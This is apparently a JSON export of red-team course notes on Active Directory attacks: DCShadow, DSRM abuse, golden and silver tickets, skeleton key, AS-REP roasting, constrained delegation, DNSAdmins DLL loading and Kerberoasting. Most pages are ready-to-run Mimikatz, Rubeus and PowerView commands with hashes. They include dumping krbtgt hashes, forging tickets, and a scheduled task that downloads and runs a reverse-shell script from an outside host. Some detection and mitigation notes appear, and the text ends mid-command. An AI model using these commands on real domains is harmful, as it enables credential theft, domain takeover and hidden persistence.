    "content": "# DC Shadow\n\n## General\n\n- Temporarily register a new domain controller in the target domain\n- Use it to \"push\" attributes like SIDHistory or SPN on the target object\n- Does not leave any change logs for the modified object\n- New DC is registered my modifying the Configuration container, SPNs of an existing computer object and some RPC services\n- Since attributes are changed from a DC, there are no change logs on the actual DC for the target object\n- Requires DA privileges by default\n- Attacker machine must be part of root domain of the forest\n\n## Exploitation\n\n- Requires two mimikatz sessions\n- One with SYSTEM privileges to start RPC servers and specifiy attributes we want to modify\n\n```powershell\n!+\n!processtoken\nlsadump::dcshadow /object:root572user /attribute:Description /value=\"Hello from DCShadow\"\n```\n\n- Another with enough privileges (DA or required permissions) to push the values\n\n```powershell\nlsadump::dcshadow /push\n```\n\n### Minimal Permissions\n\n- DCShadow can be used with minimal permissions by modifying the ACLs of the\n  - domain object\n    - `DS-Install-Replica` (Add/Remove Replica in Domain)\n    - `DS-Replication-Manage`-Topology (Manage Replication Topology)\n    - `DS-Replication-Syncrhonize` (Replication Synchronization)\n  - sites object (and its children) in the Configuration container\n    - `CreateChild` and `DeleteChild`\n  - object of the computer which is registered as a temporary DC\n    - `WriteProperty` (Not Write)\n  - target object\n    - `WriteProperty` (Not Write)\n- We can use `Set-DCShadowPermissions` from Nishang for setting the permissions\n- Then, we don't need the second mimikatz instance running as a DA to push the changes\n\n```powershell\n# Use DCShadow as user student572 to modify root572user object from machine mcorp-student572\nSet-DCShadowPermissions -FakeDC mcorp-student572 -SAMAccountName root572user -Username student572 -Verbose\n```\n\n### Interesting Attack Vectors\n\n#### Set SIDHistory of a User Account to Enterprise Admins or Domain Admins Group\n\n- User will not show up as EA/DA when running queries like `net group \"Enterprise Admins\" /domain`\n\n```powershell\nlsadump::dcshadow /object:student572 /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519\n```\n\n#### Set primaryGroupID of a User Account to Enterprise Admins or Domain Admins\n\n- Use will show up as a member of the target group when running queries like `net group \"Enterprise Admins\" /domain`\n\n```powershell\nlsadump::dcshadow /object:student572 /attribute:primaryGroupID /value:519\n```\n\n#### Modify ntSecurityDescriptor for AdminSDHolder to Add Full Control for a User\n\n```powershell\n# Get the current ACL and copy it to clipboard\n(New-Object System.DirectoryServices.DirectoryEntry((\"LDAP://CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local\")).psbase.ObjectSecurity.sddl | Set-Clipboard\n\n# Append a FullControl ACE from above for SY/BA/DA\n# Replace SY/BA/DA with our user's SID\n\n# Get current user SID with PowerView\nGet-DomainUser student572 | select objectsid\n\n# Mimikatz command\nlsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:$modifiedACEString\n```\n\n#### DCShadowception\n\n- Run DCShadow from DCShadow\n- Modifying permissions for objects so we dont need DA rights will also not leave any logs\n\n```powershell\n# Elevate to SYSTEM in mimikatz session\n!+\n!processtoken\n\n# Get ACL for domain object\n# ACEs to append:\n# (OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)\n# (OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)\n# (OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)\n(New-Object System.DirectoryServices.DirectoryEntry((\"LDAP://DC=moneycorp,DC=local\")).psbase.ObjectSecurity.sddl\n\n# Mimikatz command\nlsadump::dcshadow /stack /object:DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:$modifiedACEString\n\n# Get ACL for computer object (attacker machine)\n# ACE to append: (A;;WP;;;UserSID)\n(New-Object System.DirectoryServices.DirectoryEntry((\"LDAP://CN=mcorp-student572,CN=Computers,DC=moneycorp,DC=local\")).psbase.ObjectSecurity.sddl\n\n# Mimikatz command\nlsadump::dcshadow /stack /object:mcorp-student572$ /attribute:ntSecurityDescriptor /value:$modifiedACEString\n\n# Get ACL for target user\n# ACE to append: (A;;WP;;;UserSID)\n(New-Object System.DirectoryServices.DirectoryEntry((\"LDAP://CN=student572,CN=Users,DC=moneycorp,DC=local\")).psbase.ObjectSecurity.sddl\n\n# Mimikatz command\nlsadump::dcshadow /stack /object:student572 /attribute:ntSecurityDescriptor /value:$modifiedACEString\n\n# Get ACL for Sites object in Configuration container\n# ACE to append: (A;CI;CCDC;;;UserSID)\n(New-Object System.DirectoryServices.DirectoryEntry((\"LDAP://CN=Sites,CN=Configuration,DC=moneycorp,DC=local\")).psbase.ObjectSecurity.sddl\n\n# Mimikatz command\nlsadump::dcshadow /stack /object:CN=Sites,CN=Configuration,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:$modifiedACEString\n\n# Start RPC server\nlsadump::dcshadow\n\n# Push changes from other session\nlsadump::dcshadow /push\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/persistence/dsrm",
    "path": "active_directory/persistence/dsrm.md",
    "title": "Dsrm",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "DSRM General - DSRM is Directory Services Restore Mode - There is a local administrator on every DC called \"Administrator\" whose password is the DSRM password - DSRM password (SafeModePassword) is req...",
    "category": "active_directory",
    "content": "# DSRM\n\n## General\n\n- DSRM is Directory Services Restore Mode\n- There is a local administrator on every DC called \"Administrator\" whose password is the DSRM password\n- DSRM password (SafeModePassword) is required when a server is promoted to a DC and it is rarely changed\n- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC\n\n## Exploitation\n\n```powershell\n# Dump DSRM password (needs DA privs)\nInvoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"' -ComputerName dcorp-dc\n\n# Compare the Administrator hash with the Administrator hash of below command\n# The first on is the DSRM local Administrator\nInvoke-Mimikatz -Command '\"lsadump::lsa /patch\"' -ComputerName dcorp-dc\n\n# Need to change Logon Behavior for DSRM account before we can pass the hash to login\nEnter-PSSession -ComputerName dcorp-dc\nNew-ItemProperty \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\" -Name \"DsrmAdminLogonBehavior\" -Value 2 -PropertyType DWORD\n\n# Pass the hash to login\nInvoke-Mimikatz -Command '\"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe\"'\n\n# Check if we can access the DC\nls \\\\dcorp-dc\\c$\n\n# Get shell\n.\\PsExec.exe -accepteula \\\\dcorp-dc cmd.exe\n```\n\n## Detection\n\n- Event IDs:\n  - 4657: Audit creation/change of HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ DsrmAdminLogonBehavior\n  - 4624: Account Logon\n  - 4634: Account Logoff\n  - 4672: Admin Logon\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/persistence/golden_tickets",
    "path": "active_directory/persistence/golden_tickets.md",
    "title": "Golden_tickets",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Golden Tickets General - Golden ticket is signed and ecrypted by hash of krbtgt account, making it a valid TGT ticket - Since user account validation is not done by the DC/KDC until TGT is older than ...",
    "category": "active_directory",
    "content": "# Golden Tickets\n\n## General\n\n- Golden ticket is signed and ecrypted by hash of krbtgt account, making it a valid TGT ticket\n- Since user account validation is not done by the DC/KDC until TGT is older than 20 minutes, we can use even deleted/revoked accounts\n- krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine\n- Password change has no effect on this attack\n\n## Exploitation\n\n### Arguments\n\n| Argument | Description |\n| --- | --- |\n| kerberos::golden | Module name |\n| /domain:domain:dollarcorp.moneycorp.local | Domain FQDN |\n| /sid:S-1-5-21-1874506631-3219952063-538504511 | SID of the domain |\n| /krbtgt:ff46a9d8bd66c6efd77603da26796f35 | NTLM hash of the krbtgt account. Use /aes128 and /aes256 for using AES |\n| /User:Administrator | Username for which the TGT is generated |\n| /id:500 /groups:512 | Optional User RID (default 500) and Group default 513 512 520 518 519) |\n| /startoffset:0 | Optional when the ticket is available (default 0 right now) in minutes. Use negative for a ticket available from past and a larger number for future. |\n| /endin:600 | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |\n| /renewmax:10080 | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |\n| /ptt | Inject ticket in current PowerShell process |\n| /ticket | Save ticket to file for later use |\n\n### Commands\n\n```powershell\n# Execute mimikatz on DC as DA to get krbtgt hash\nInvoke-Mimikatz -Command '\"lsadump::lsa /patch\"' -ComputerName \"dcorp-dc\"\n\n# Use DCSync with DA privileges to get krbtgt hash\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'\n\n# On any machine\n# Inject ticket into current PowerShell session\nInvoke-Mimikatz -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /User:Administrator /id:500 /groups:512 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /startoffset:0 /endin:600 /renewmax:10080 /ptt\"'\n\n# Save ticket to file for later use\nInvoke-Mimikatz -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /User:Administrator /id:500 /groups:512 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /startoffset:0 /endin:600 /renewmax:10080 /ticket:krbtgt.kirbi\"'\n\n# Get domain policy for tickets to set appropriate values\n(Get-DomainPolicy -Domain lab.local).\"Kerberos Policy\"\n\n# Use AES keys to avoid downgrading encryption and generating abnormal traffic/alerts\nInvoke-Mimikatz -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /User:Administrator /id:500 /groups:512 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /aes128:AES128KEY /aes256:AES256KEY /startoffset:0 /endin:600 /renewmax:10080 /ticket:krbtgt.kirbi\"'\n\n# Inject ticket into current session\nInvoke-Mimikatz -Command '\"kerberos::ptt krbtgt.kirbi\"'\n```\n\n### Executing Commands / Getting a Shell\n\n```powershell\n# Inject ticket and open command prompt in current context\nInvoke-Mimikatz -Command '\"kerberos::ptt krbtgt.kirbi\" \"misc::cmd\"'\n\n# Open command prompt on other machine\nPsExec.exe -AcceptEULA \\\\dcorp-dc cmd.exe\n\n# Run command using WMI\ngwmi -Class win32_computersystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local\n```\n\n## Detection\n\n- Event IDs:\n  - 4624: Account Logon\n  - 4634: Account Logoff\n  - 4672: Admin Logon\n\n```powershell\nGet-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property *\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/persistence/silver_tickets",
    "path": "active_directory/persistence/silver_tickets.md",
    "title": "Silver_tickets",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Silver Tickets General - A valid TGS - Encrypted and signed by NTLM hash of the target service account - Services rarely check PAC (Privileged Attribute Certificate) - Services will allow access only ...",
    "category": "active_directory",
    "content": "# Silver Tickets\n\n## General\n\n- A valid TGS\n- Encrypted and signed by NTLM hash of the target service account\n- Services rarely check PAC (Privileged Attribute Certificate)\n- Services will allow access only to the services themselves\n- Reasonable persistence period (detauled 30 days for computer accounts)\n\n## Exploitation\n\n### Arguments\n\n| Argument | Description |\n| --- | --- |\n| kerberos::golden | Name of the module (there is no Silver module!) |\n| /domain:domain:dollarcorp.moneycorp.local | Domain FQDN |\n| /sid:S-1-5-21-1874506631-3219952063-538504511 | SID of the domain |\n| /target:dcorp dc.dollarcorp.moneycorp.local | Target server FQDN |\n| /User:Administrator | Username for which the TGT is generated |\n| /id:500 /groups:512 | Optional User RID (default 500) and Group (default 513 512 520 518 519) |\n| /service:cifs | The SPN name of the target service for the TGS |\n| /rc4:6f5b5acaf7433b3282ac22e21e62ff22 | NTLM (RC4) hash of the service/machine account (<MACHINE-NAME$>). Use /aes128 and /aes256 for using AES keys. |\n| /startoffset:0 | Optional when the ticket is available (default 0 right now) in minutes. Use negative for a ticket available from past and a larger number for future. |\n| /endin:600 | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |\n| /renewmax:10080 | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |\n| /ptt | Injects the ticket in current PowerShell process no need to save the ticket on disk |\n\n### Commands\n\n```powershell\n# Check Kerberos ticket policy using PowerView\n(Get-DomainPolicy -Domain lab.local).\"Kerberos Policy\"\n\n# Execute mimikatz on DC as DA to get dcorp-dc$ (machine account) hash\nInvoke-Mimikatz -Command '\"lsadump::lsa /patch /user:dcorp-dc$\"' -ComputerName \"dcorp-dc\"\n\n# Using hash of the DC computer account, below command provides access to shares on the DC\n# Similar command can be used for any other service on a machine\n# Example services: HOST, RPCSS, WSMAN\nInvoke-Mimikatz -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:CIFS /rc4:d32ef7a25657da14a143e0185488a1a3 /ptt\"'\n\n# Use proper values from kerberos policy and AES keys to be stealthier\nInvoke-Mimikatz -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:CIFS /rc4:d32ef7a25657da14a143e0185488a1a3 /aes128:AES128KEY /aes256:AES256KEY /ptt\"'\n\n# Get shell through PsExec\n.\\PsExec.exe -AcceptEULA \\\\dcorp-dc.dollarcorp.moneycorp.local cmd\n```\n\n## Getting Command Execution\n\n### Scheduled Tasks through HOST Service\n\n```powershell\n# Create silver ticket for the HOST SPN which will allow us to schedule a task on the target\nInvoke-Mimikatz -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:HOST /rc4:d32ef7a25657da14a143e0185488a1a3 /ptt\"'\n\n# Create scheduled task\nschtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU \"NT Authority\\SYSTEM\" /TN \"STCheck\" /TR \"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.72/Invoke-PowerShellTcp.ps1''')'\"\n\n# Run task on the target\nschtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN \"STCheck\"\n\n# Clean Up\nschtasks /delete /tn \"STCheck\" /s dcorp-dc.dollarcorp.moneycorp.local /f\n```\n\n### WMI\n\n```powershell\n# Create two tickets - one for HOST service and another for RPCSS\nInvoke-Mimikatz -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:HOST /rc4:d32ef7a25657da14a143e0185488a1a3 /ptt\"'\nInvoke-Mimikatz -Command '\"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /user:Administrator /service:RPCSS /rc4:d32ef7a25657da14a143e0185488a1a3 /ptt\"'\n\n# Run WMI commands on DC\nGet-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local\n```\n\n## Detection\n\n- Event IDs:\n  - 4624: Account Logon\n  - 4634: Account Logoff\n  - 4672: Admin Logon\n\n```powershell\nGet-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property *\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/persistence/skeleton_key",
    "path": "active_directory/persistence/skeleton_key.md",
    "title": "Skeleton_key",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Skeleton Key General - Patch a Domain Controller (lsass process) so that it allows access as any user with a single password - Discovered in malware named Skeleton Key malware - All publicly known met...",
    "category": "active_directory",
    "content": "# Skeleton Key\n\n## General\n\n- Patch a Domain Controller (lsass process) so that it allows access as any user with a single password\n- Discovered in malware named Skeleton Key malware\n- All publicly known methods are NOT persistent accross reboots\n- Mimikatz to the rescue\n\n## Exploitation\n\n```powershell\n# Inject skeleton key on DC of choice with default password of 'mimikatz'. DA privs required\nInvoke-Mimikatz -Command '\"privilege::debug\" \"misc::skeleton\"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local\n\n# If lsass is running as procted process we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of target DC. Very noisy!\nmimikatz # privilege::debug\nmimikatz # !+\nmimikatz # !processprotect /process:lsass.exe /remove\nmimikatz # misc::skeleton\nmimikatz # !-\n\n# Access machine with valid username\nEnter-PSSession -ComputerName dcorp-dc -Credential dcorp\\administrator\n```\n\n## Detection\n\n- Events:\n  - 7045: A service was installed in the system (Type: Kernel Mode Driver)\n  - 4624: Account Logon\n  - 4634: Account Logoff\n  - 4672: Admin Logon\n- Events(\"Audit Privilege Use\" must be enabled)\n  - 4673: Sensitive Privilege Use\n  - 4611: A trusted logon process has been registered with the Local Security Authority\n\n```powershell\nGet-WinEvent -FilterHashtable @{Logname='Security';ID=7045} | ?{$_.message -like \"*Kernel Mode Driver*\"}\n\n# Not recommended (detects only stock mimidriv)\nGet-WinEvent -FilterHashtable @{Logname='Security';ID=7045} | ?{$_.message -like \"*Kernel Mode Driver*\" -and $_.message -like \"*mimidrv*\"}\n```\n\n## Mitigation\n\n- Run lsass.exe as a protected process, as it forces an attacker to load a kernel mode driver -> log detection\n- Test before implementing, as many drivers and plguins may not load with the protection\n\n```powershell\nNew-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ -Name RunAsPPL -Value 1 -Verbose\n\n# Verify after reboot\nGet-WinEvent -FilterHashtable @{Logname='Security';ID=12} | ?{$_.message -like \"*protected process*\"}\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/privilege_escalation/README",
    "path": "active_directory/privilege_escalation/README.md",
    "title": "README",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Privilege Escalation",
    "category": "active_directory",
    "content": "# Privilege Escalation\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/privilege_escalation/as-rep_roasting",
    "path": "active_directory/privilege_escalation/as-rep_roasting.md",
    "title": "As Rep_roasting",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "AS-REP Roasting Overview - Dump krbasrep5 hashes of user accounts without Kerberos pre-authentication - Users do not have to be service accounts - Must have pre-authentication disabled - Can request a...",
    "category": "active_directory",
    "content": "# AS-REP Roasting\n\n## Overview\n\n- Dump krbasrep5 hashes of user accounts without Kerberos pre-authentication\n- Users do not have to be service accounts\n- Must have pre-authentication disabled\n- Can request any authentication data (encrypted TGT) for any user since KDC skips validation\n- Crack dumped hash with hashcat\n\n## Exploitation\n\n### Force Disable Kerberos Preauth\n\n```powershell\n# Using PowerView 3.0/dev\n# Enumerate permissions for RDPUsers on ACLS\nInvoke-ACLScanner -ResolveGUIDS | ?{ $_.IdentityReferenceName -match \"RDPUsers\" }\n\n# Disable preauth for user\nSet-DomainObject -Identity Control572User -XOR @{useraccountcontrol=4194304} -Verbose\n```\n\n### Enumerate Users with Preauth Disabled\n\n```powershell\n# Using PowerView 3.0/dev\nGet-DomainUser -PreauthNotRequired -Verbose | Select samaccountname\n\n# Using AD Module\nGet-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth\n\n# Query AS-REP-roastable users with impacket from Kali host\n# Supply userlist and don't require authentication\nGetNPUsers.py -dc-ip 10.10.149.145 -no-pass -usersfile users.txt -format hashcat -outputfile hashes.asrep spookysec.local/\n\n# Dump KRBASREP5 hash for specific user and output in hashcat format to file\n.\\Rubeus.exe asreproast /user:control572user /format:hashcat /outfile:control572user.asrep\n\n# Dump hashes with credentials using CrackMapExec\ncrackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt\n\n# Transfer hash onto attacker and insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....\n# Crack hash with hashcat\nhashcat -a 0 -m 18200 hash.txt rockyou.txt\n```\n\n## Mitigation\n\n- Strong password policy\n- Enable Kerberos Pre-Authentication\n\n## Further Reading\n\n- [iRedTeam: AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)\n- [XPN: Kerberos AD Attacks - More Roasting with AS-REP](https://blog.xpnsec.com/kerberos-attacks-part-2/)\n- [harmj0y: Roasting AS-REPs](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/privilege_escalation/constrained_delegation",
    "path": "active_directory/privilege_escalation/constrained_delegation.md",
    "title": "Constrained_delegation",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Constrained Delegation General - When enabled on a service account, allows access only to specified services on specified computers as a user - Typical scenario:   - User authenticates to a web servic...",
    "category": "active_directory",
    "content": "# Constrained Delegation\n\n## General\n\n- When enabled on a service account, allows access only to specified services on specified computers as a user\n- Typical scenario:\n  - User authenticates to a web service without Kerberos\n  - Web services makes requests to database server to fetch results based on the user's authorization\n- To impersonate the user, Service for User (S4U) extension is used which provides two extensions\n\n### Service for User to Self (S4U2self) Extension\n\n- Allows service to obtain a forwardable TGS to itself on behalf of a user\n- Only needs the user principal name but NO PASSWORD\n- Service account must have the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` - T2A4D UserAccountControl attribute set\n\n### Service for User to Proxy (S4U2proxy) Extension\n\n- Allows service to obtain a TGS to a second service on behalf of a user\n- Uses the previously obtained TGS from S4U2self\n- Only allows access to services listed in the `msDS-AllowedToDelegateTo` attribute\n- Attribute contains list of SPNs to which the user tokens can be forwarded\n\n## Example Scenario: Constrained Delegation with Protocol Transition\n\n1. User (Joe) authenticates to web service running under `websvc` service account using non-Kerberos method\n2. Web service requests ticket from KDC for Joe without supplying a password, as the websvc account\n3. KDC checks the websvc userAccountControl value for TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute\n4. If set, KDC checks that Joe's account is not blocked for delegation\n5. If OK, KDC returns forwardable ticket for Joe's account (S4U2self)\n6. Service passes ticket back to the KDC and requests a TGS for the CIFS/dcorp-mssql.dollarcorp.moneycorp.local service\n7. KDC checks the msDS-AllowedToDelegateTo field on the websvc account\n8. If SPN is listed there, KDC return TGS for dcorp-mssql (S4U2proxy)\n9. Web service can now authenticate to the CIFS on dcorp-mssql as Joe using the obtained TGS\n\n## Exploitation\n\n### For Users with Constrained Delegation\n\n- Requires access to the user/service account\n- If we can access it, we can access all the listed services in msDS-AllowedToDelegateTo attribute\n- Can access the services as ANY user\n\n```powershell\n# Enumerate users with constrained delegation enabled\n# PowerView 3.0\nGet-DomainUser -TrustedToAuth\n\n# AD Module\nGet-ADObject -Filter {msDS-AllowedToDelegateTo} -ne \"$null\"} -Properties msDS-AllowedToDelegateTo\n\n# Kekeo\n# Request TGT for websvc user\ntgt::ask /domain:dollarcorp.moneycorp.local /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f\n\n# Request TGS using s4u in Kekeo and supplying the requested TGT\n# Impersonate the Administrator Domain Admin\n# We gain access to the CIFS service\ntgs::s4u /tgt:tgt.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.local\n\n# Inject the ticket using mimikatz\nInvoke-Mimikatz -Command '\"kerberos::ptt tgs.kirbi\"'\n\n# We can do both steps at the same time using Rubeus\n# Request TGT and TGS in a single command\n.\\Rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:Administrator /msdsspn:\"CIFS/dcorp-mssql.dollarcorp.moneycorp.local\" /ptt\n\n# We can now access the CIFS service on dcorp-mssql as the dcorp\\Administrator DA user\nls \\\\dcorp-mssql.dollarcorp.moneycorp.local\\c$\n```\n\n### For Computers with Constrained Delegation\n\n- Delegation occurs not only for specific service\n- Occurs for ANY service running under the same service account\n- No validation for SPN specified\n- Requires hash of the machine account of the computer running with constrained delegation\n\n```powershell\n# Enumerate computers with constrained delegation enabled\n# PowerView 3.0\nGet-DomainComputer -TrustedToAuth\n\n# AD Module\nGet-ADObject -Filter {msDS-AllowedToDelegateTo} -ne \"$null\"} -Properties msDS-AllowedToDelegateTo\n\n# Kekeo\n# Request TGT for machine account\ntgt::ask /domain:dollarcorp.moneycorp.local /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96\n\n# Using s4u, request TGS to access the LDAP service as the DA Adminstrator\ntgs::s4u /tgt:tgt.kirbi /user:Administrator@dollarcorp.moneycorp.LOCAL /service:time/dcorp-dc.dollarcorp.moneycorp.local|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL\n\n# Inject ticket into memory with Mimikatz\nInvoke-Mimikatz -Command '\"kerberos::ptt tgs.kirbi\"'\n\n# Request TGS and TGT at the same time with Rubeus\n.\\Rubeus.exe s4u /user:dcorp-adminsrv$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:Administrator /msdsspn:\"time/dcorp-dc.dollarcorp.moneycorp.local\" /altservice:ldap /ptt\n\n# Execute DCSync attack with new permissions\nInvoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'\n```\n\n## Mitigation\n\n- Disable Kerberos delegation where possible\n- Limit DA/Admin logins to specific services\n- Set \"Account is sensitive and cannot be delegated\" for privileged accounts\n\n## Further Reading\n\n- [iRedTeam: Kerberos Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)\n- [HackTricks: Constrained Delegation](https://book.hacktricks.xyz/windows/active-directory-methodology/constrained-delegation)\n- [PayloadsAllTheThings: Kerberos Constrained Delegation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberos-constrained-delegation)\n- [ShenanigansLabs: Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/privilege_escalation/dns_admins",
    "path": "active_directory/privilege_escalation/dns_admins.md",
    "title": "Dns_admins",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "DNS Admins General - Members of the DNS Admins group can load arbitrary DLL's with the privileges of dns.exe (SYSTEM) - If the DC serves as DNS server, we can escalate to DA - But: need to be able to ...",
    "category": "active_directory",
    "content": "# DNS Admins\n\n## General\n\n- Members of the DNS Admins group can load arbitrary DLL's with the privileges of dns.exe (SYSTEM)\n- If the DC serves as DNS server, we can escalate to DA\n- But: need to be able to restart the DNS on the DC\n\n## Exploitation\n\n- Can use mimilib.dll from mimikatz\n- Modify kdns.c or use boiler plate from [here](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)\n- mimilib.dll logs all DNS queries to C:\\Windows\\System32\\kiwidns.log by default\n- Host DLL on SMB server with anonymous access\n- Be careful, else DNS might fail -> noisy!\n\n```powershell\n# Enumerate members of DNSAdmins group\n# Using PowerView 3.0\nGet-DomainGroupMember \"DNSAdmins\"\n\n# Using AD Module\nGet-ADGroupMember -Identity \"DNSAdmins\"\n\n# With privileges of DNSAdmins member, e.g. through PTH, configure DLL\n# Using dnscmd.exe (needs RSAT DNS)\ndnscmd dcorp-dc /config /serverlevelplugindll \\\\172.16.72.100\\dll\\mimilib.dll\n\n# Using DNSServer module (needds RSAT DNS)\n$dnsettings = Get-DNSServerSetting -ComputerName dcorp-dc -Verbose -All\n$dnsettings.ServerLevelPluginDll = \"\\\\172.16.72.100\\dll\\mimilib.dll\"\nSet-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose\n\n# Restart DNS service\nsc \\\\dcorp-dc stop dns\nsc \\\\dcorp-dc start dns\n```\n",
    "frontmatter": {}
  },
  {
    "slug": "active_directory/privilege_escalation/kerberoasting",
    "path": "active_directory/privilege_escalation/kerberoasting.md",
    "title": "Kerberoasting",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Kerberoasting Overview - Request service ticket for any service with registered SPN - Use ticket to crack service password - Use BloodHound to find Kerberoastable accounts - If service is a domain adm...",
    "category": "active_directory",
    "content": "# Kerberoasting\n\n## Overview\n\n- Request service ticket for any service with registered SPN\n- Use ticket to crack service password\n- Use BloodHound to find Kerberoastable accounts\n- If service is a domain admin we can gather loot and dump the NTDS.dit\n- If not, you can use it to log into other systems and pivot or escalate\n- Use cracked password for password spraying\n\n## Exploitation\n\n### Find Accounts with SPN\n\n```powershell\n# Windows built-in\nsetspn -T DOMAIN -Q ​*/*\n\n# PowerView\nGet-NetUser -SPN | Select -ExpandProperty serviceprincipalname\n\n# AD Module\nGet-ADUser -Filter { ServicePrincipalName -ne \"$null\" } -Properties ServicePrincipalName\n```\n\n### Force Set SPN\n\nIf we have enough rights on user (GenericAll/GenericWrite) we can set an SPN for a user then request a TGS for it for Kerberoasting.\n\n```powershell\n# Enumerate the permissions for RDPUsers on ACLs using PowerView 3.0/dev\n# Enumerate the permissions for RDPUsers on ACLs using PowerView 3.0/dev\nInvoke-ACLScanner -ResolveGUIDs | ?{ $_.IdentityReferenceName -match \"RDPUsers\" }\n\n# Check if user already has a SPN\n# Using PowerView 3.0\nGet-DomainUser -Identity support572user | Select serviceprincipalname\n\n# Using AD Module\nGet-ADUser -Identity support572user -Properties ServicePrincipalName | Select ServicePrincipalName\n\n# Set a SPN for the user (must be unique in domain)\n# Using PowerView 3.0\nSet-DomainObject -Identity support572user -Set @{serviceprincipalname=\"dcorp/bufusvc\"}\n\n# Using AD Module\nSet-ADUser -Identity 